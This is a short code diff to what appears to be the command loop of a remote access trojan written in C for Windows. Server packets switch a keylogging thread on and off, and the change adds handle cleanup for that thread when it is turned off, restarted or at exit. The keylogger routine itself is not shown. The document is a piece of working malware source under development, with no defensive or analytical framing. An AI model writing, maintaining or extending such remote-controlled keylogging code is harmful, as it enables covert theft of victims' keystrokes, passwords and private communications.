@@ -109,11 +109,17 @@ int main() {
     }
     switch (p->op) {
     case RAT_PACKET_TURN_OFF:
+      if (keylog_thread) {
+        CloseHandle(keylog_thread);
+        keylog_thread = NULL;
+      }
       keylog_on = 0;
       break;
     case RAT_PACKET_TURN_ON:
       if (!keylog_on) {
         keylog_on = 1;
+        if (keylog_thread)
+          CloseHandle(keylog_thread);
         keylog_thread = create_thread(keylog_handler, NULL);
       }
       break;
@@ -188,6 +194,8 @@ exit:
   closesocket(server);
   server = INVALID_SOCKET;
   WaitForSingleObject(keylog_thread, INFINITE);
+  if (keylog_thread)
+    CloseHandle(keylog_thread);
   WSACleanup();
   return 0;
 }
